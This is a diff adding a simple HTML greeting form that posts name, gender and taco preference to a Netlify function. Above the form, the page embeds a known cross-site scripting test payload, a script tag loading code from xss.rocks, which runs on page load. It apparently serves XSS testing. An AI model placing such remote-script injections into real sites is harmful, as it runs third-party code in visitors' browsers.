@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="site.css">
+</head>
+
+<body>
+
+  <SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
+
+  <form action="/.netlify/functions/helper" method="POST">
+    <p>
+      <label>What’s your first name?<br /><input type="text" id="firstname" name="firstname"></label>
+    </p>
+    <p>
+      <label>What's your gender?</label><br>
+      <label><input type="radio" name="gender" value="g">Male</label><br>
+      <label><input type="radio" name="gender" value="g">Female</label><br>
+      <label><input type="radio" name="gender" value="g">Non-binary</label><br>
+    </p>
+    <p>
+      <label>Do you like tacos?<input type="checkbox" name="likesTacos"></label>
+    </p>
+    <p><button type="submit">Say hello!</button></p>
+  </form>
+  </article>
+</body>
+
+</html>
